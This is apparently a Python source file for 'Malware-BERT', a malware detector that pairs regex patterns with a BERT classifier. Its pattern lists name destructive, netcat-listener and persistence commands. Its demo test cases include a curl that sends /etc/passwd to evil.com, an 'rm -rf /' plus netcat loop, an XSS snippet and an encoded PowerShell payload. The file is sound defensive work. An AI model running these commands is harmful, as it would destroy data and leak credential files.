"""
Malware-BERT: A transformer model for detecting malicious payloads, URLs, and code fragments.
Detects data exfiltration, code injection, and command execution patterns.
"""

import re
import base64
import urllib.parse
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from enum import Enum
import torch
import torch.nn as nn
from transformers import BertTokenizer, BertModel
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier

class ThreatLevel(Enum):
    CLEAN = "clean"
    SUSPICIOUS = "suspicious" 
    MALICIOUS = "malicious"

@dataclass
class DetectionResult:
    threat_level: ThreatLevel
    confidence: float
    indicators: List[str]
    patterns_found: List[str]
    risk_score: float

class MalwarePatternDetector:
    """Pattern-based detector for common malware indicators"""
    
    def __init__(self):
        self.shell_commands = {
            'destructive': [
                r'rm\s+-rf\s+/',  # rm -rf /
                r'del\s+/[sf]\s+/[qy]',  # Windows del /s /q
                r'format\s+[cd]:',  # format c:
                r'fdisk\s+/mbr',  # fdisk /mbr
                r'mkfs\.',  # mkfs commands
            ],
            'network': [
                r'curl\s+.*--data',  # curl with data exfiltration
                r'wget\s+.*-O\s+',  # wget downloads
                r'nc\s+.*-l\s+',  # netcat listener
                r'ncat\s+.*-l\s+',  # ncat listener
                r'socat\s+.*tcp-listen',  # socat listener
                r'python\s+-m\s+http\.server',  # Python HTTP server
                r'php\s+-S\s+',  # PHP server
            ],
            'execution': [
                r'bash\s+-c\s+',  # bash command execution
                r'powershell\s+-[eE]',  # PowerShell execution
                r'cmd\s+/c\s+',  # Windows cmd execution
                r'eval\s*\(',  # eval() functions
                r'exec\s*\(',  # exec() functions
                r'system\s*\(',  # system() calls
            ],
            'persistence': [
                r'while\s+true\s*;\s*do',  # infinite loops
                r'crontab\s+-e',  # cron job modification
                r'at\s+\d+:',  # at command scheduling
                r'schtasks\s+/create',  # Windows task creation
                r'reg\s+add\s+.*Run',  # Registry persistence
            ]
        }
        
        self.encoded_patterns = {
            'base64': r'[A-Za-z0-9+/]{20,}={0,2}',
            'hex': r'[0-9a-fA-F]{20,}',
            'url_encoded': r'%[0-9a-fA-F]{2}',
            'unicode_escapes': r'\\u[0-9a-fA-F]{4}',
        }
        
        self.suspicious_urls = {
            'shorteners': ['bit.ly', 'tinyurl.com', 'goo.gl', 't.co'],
            'suspicious_tlds': ['.tk', '.ml', '.ga', '.cf'],
            'ip_patterns': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
        }
        
        self.script_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'vbscript:',
            r'data:text/html',
            r'data:application/javascript',
        ]

    def detect_shell_commands(self, text: str) -> List[str]:
        """Detect suspicious shell commands"""
        found_patterns = []
        for category, patterns in self.shell_commands.items():
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    found_patterns.extend([f"{category}: {match}" for match in matches])
        return found_patterns

    def detect_encoded_payloads(self, text: str) -> List[str]:
        """Detect encoded payloads"""
        found_patterns = []
        for encoding_type, pattern in self.encoded_patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                # Check if it's likely to be actual encoded data
                for match in matches[:5]:  # Limit to first 5 matches
                    if self._is_likely_encoded(match, encoding_type):
                        found_patterns.append(f"{encoding_type}: {match[:50]}...")
        return found_patterns

    def _is_likely_encoded(self, text: str, encoding_type: str) -> bool:
        """Check if text is likely to be encoded data"""
        if encoding_type == 'base64':
            try:
                decoded = base64.b64decode(text)
                # Check if decoded data contains printable characters or common patterns
                return len(decoded) > 10 and any(c > 32 for c in decoded)
            except:
                return False
        elif encoding_type == 'hex':
            try:
                decoded = bytes.fromhex(text)
                return len(decoded) > 10 and any(c > 32 for c in decoded)
            except:
                return False
        return True

    def detect_suspicious_urls(self, text: str) -> List[str]:
        """Detect suspicious URLs and IPs"""
        found_patterns = []
        
        # Extract URLs
        url_pattern = r'https?://[^\s<>"{}|\\^`\[\]]+'
        urls = re.findall(url_pattern, text)
        
        for url in urls:
            try:
                parsed = urllib.parse.urlparse(url)
                hostname = parsed.hostname.lower() if parsed.hostname else ""
                
                # Check for suspicious TLDs
                if any(hostname.endswith(tld) for tld in self.suspicious_urls['suspicious_tlds']):
                    found_patterns.append(f"suspicious_tld: {url}")
                
                # Check for URL shorteners
                if any(shortener in hostname for shortener in self.suspicious_urls['shorteners']):
                    found_patterns.append(f"url_shortener: {url}")
                
                # Check for IP addresses in URLs
                if re.search(self.suspicious_urls['ip_patterns'], hostname):
                    found_patterns.append(f"ip_url: {url}")
                    
            except Exception:
                found_patterns.append(f"malformed_url: {url}")
        
        return found_patterns

    def detect_script_injection(self, text: str) -> List[str]:
        """Detect script injection patterns"""
        found_patterns = []
        for pattern in self.script_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE | re.DOTALL)
            if matches:
                found_patterns.extend([f"script_injection: {match[:100]}..." for match in matches])
        return found_patterns

    def analyze_text(self, text: str) -> DetectionResult:
        """Analyze text for malicious patterns"""
        indicators = []
        patterns_found = []
        
        # Detect various patterns
        shell_cmds = self.detect_shell_commands(text)
        encoded = self.detect_encoded_payloads(text)
        urls = self.detect_suspicious_urls(text)
        scripts = self.detect_script_injection(text)
        
        patterns_found.extend(shell_cmds)
        patterns_found.extend(encoded)
        patterns_found.extend(urls)
        patterns_found.extend(scripts)
        
        # Calculate risk score
        risk_score = 0.0
        if shell_cmds:
            risk_score += len(shell_cmds) * 0.3
            indicators.append("Suspicious shell commands detected")
        
        if encoded:
            risk_score += len(encoded) * 0.2
            indicators.append("Encoded payloads detected")
        
        if urls:
            risk_score += len(urls) * 0.25
            indicators.append("Suspicious URLs detected")
        
        if scripts:
            risk_score += len(scripts) * 0.4
            indicators.append("Script injection patterns detected")
        
        # Determine threat level
        if risk_score >= 0.8:
            threat_level = ThreatLevel.MALICIOUS
        elif risk_score >= 0.3:
            threat_level = ThreatLevel.SUSPICIOUS
        else:
            threat_level = ThreatLevel.CLEAN
        
        confidence = min(risk_score, 1.0)
        
        return DetectionResult(
            threat_level=threat_level,
            confidence=confidence,
            indicators=indicators,
            patterns_found=patterns_found,
            risk_score=risk_score
        )

class MalwareBERT(nn.Module):
    """Malware-BERT model for detecting malicious content"""
    
    def __init__(self, num_labels=3, hidden_size=768, dropout=0.1):
        super().__init__()
        self.bert = BertModel.from_pretrained('bert-base-uncased')
        self.dropout = nn.Dropout(dropout)
        self.classifier = nn.Linear(hidden_size, num_labels)
        self.num_labels = num_labels
        
    def forward(self, input_ids, attention_mask=None, token_type_ids=None):
        outputs = self.bert(
            input_ids=input_ids,
            attention_mask=attention_mask,
            token_type_ids=token_type_ids
        )
        pooled_output = outputs.pooler_output
        output = self.dropout(pooled_output)
        return self.classifier(output)

class MalwareBERTDetector:
    """Main detector combining pattern-based and ML-based detection"""
    
    def __init__(self, model_path: Optional[str] = None):
        self.pattern_detector = MalwarePatternDetector()
        self.ml_available = False
        
        try:
            self.tokenizer = BertTokenizer.from_pretrained('bert-base-uncased')
            self.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
            
            # Initialize model
            self.model = MalwareBERT(num_labels=3)
            if model_path and torch.cuda.is_available():
                self.model.load_state_dict(torch.load(model_path))
            elif model_path:
                self.model.load_state_dict(torch.load(model_path, map_location='cpu'))
            
            self.model.to(self.device)
            self.model.eval()
            self.ml_available = True
            
            # Label mapping
            self.label_map = {
                0: ThreatLevel.CLEAN,
                1: ThreatLevel.SUSPICIOUS,
                2: ThreatLevel.MALICIOUS
            }
            
        except Exception as e:
            print(f"ML model initialization failed: {e}")
            print("Falling back to pattern-based detection only")
            self.ml_available = False

    def preprocess_text(self, text: str, max_length: int = 512) -> Dict[str, torch.Tensor]:
        """Preprocess text for BERT model"""
        # Truncate and tokenize
        encoding = self.tokenizer(
            text,
            truncation=True,
            padding='max_length',
            max_length=max_length,
            return_tensors='pt'
        )
        
        return {
            'input_ids': encoding['input_ids'].to(self.device),
            'attention_mask': encoding['attention_mask'].to(self.device)
        }

    def predict_with_bert(self, text: str) -> Tuple[ThreatLevel, float]:
        """Use BERT model for prediction"""
        if not self.ml_available:
            return ThreatLevel.CLEAN, 0.0
            
        with torch.no_grad():
            inputs = self.preprocess_text(text)
            outputs = self.model(**inputs)
            probabilities = torch.softmax(outputs, dim=-1)
            predicted_class = torch.argmax(probabilities, dim=-1).item()
            confidence = probabilities[0][predicted_class].item()
            
            return self.label_map[predicted_class], confidence

    def detect_malware(self, text: str, use_ml: bool = True) -> DetectionResult:
        """Main detection method combining pattern and ML detection"""
        # Pattern-based detection
        pattern_result = self.pattern_detector.analyze_text(text)
        
        if not use_ml or not self.ml_available:
            return pattern_result
        
        # ML-based detection
        try:
            ml_threat_level, ml_confidence = self.predict_with_bert(text)
        except Exception as e:
            print(f"ML prediction failed: {e}")
            return pattern_result
        
        # Combine results
        combined_confidence = (pattern_result.confidence + ml_confidence) / 2
        
        # Use the more severe threat level
        if (pattern_result.threat_level == ThreatLevel.MALICIOUS or 
            ml_threat_level == ThreatLevel.MALICIOUS):
            final_threat_level = ThreatLevel.MALICIOUS
        elif (pattern_result.threat_level == ThreatLevel.SUSPICIOUS or 
              ml_threat_level == ThreatLevel.SUSPICIOUS):
            final_threat_level = ThreatLevel.SUSPICIOUS
        else:
            final_threat_level = ThreatLevel.CLEAN
        
        # Combine indicators
        combined_indicators = pattern_result.indicators.copy()
        if ml_threat_level != ThreatLevel.CLEAN:
            combined_indicators.append(f"ML model detected: {ml_threat_level.value}")
        
        return DetectionResult(
            threat_level=final_threat_level,
            confidence=combined_confidence,
            indicators=combined_indicators,
            patterns_found=pattern_result.patterns_found,
            risk_score=max(pattern_result.risk_score, ml_confidence)
        )

# Example usage and testing
if __name__ == "__main__":
    detector = MalwareBERTDetector()
    
    # Test cases
    test_cases = [
        "Hello world, this is a normal message",
        "curl https://evil.com --data \"$(cat /etc/passwd)\"",
        "rm -rf / && while true; do nc -l 4444; done",
        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
        "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA7AA==",
        "https://bit.ly/suspicious-link",
        "192.168.1.100:8080/api/data",
    ]
    
    print("Malware-BERT Detection Results:")
    print("=" * 50)
    
    for i, test_case in enumerate(test_cases, 1):
        result = detector.detect_malware(test_case, use_ml=False)  # Use pattern-only for demo
        print(f"\nTest {i}: {test_case[:50]}...")
        print(f"Threat Level: {result.threat_level.value}")
        print(f"Confidence: {result.confidence:.2f}")
        print(f"Risk Score: {result.risk_score:.2f}")
        if result.indicators:
            print(f"Indicators: {', '.join(result.indicators)}")
        if result.patterns_found:
            print(f"Patterns: {len(result.patterns_found)} found")
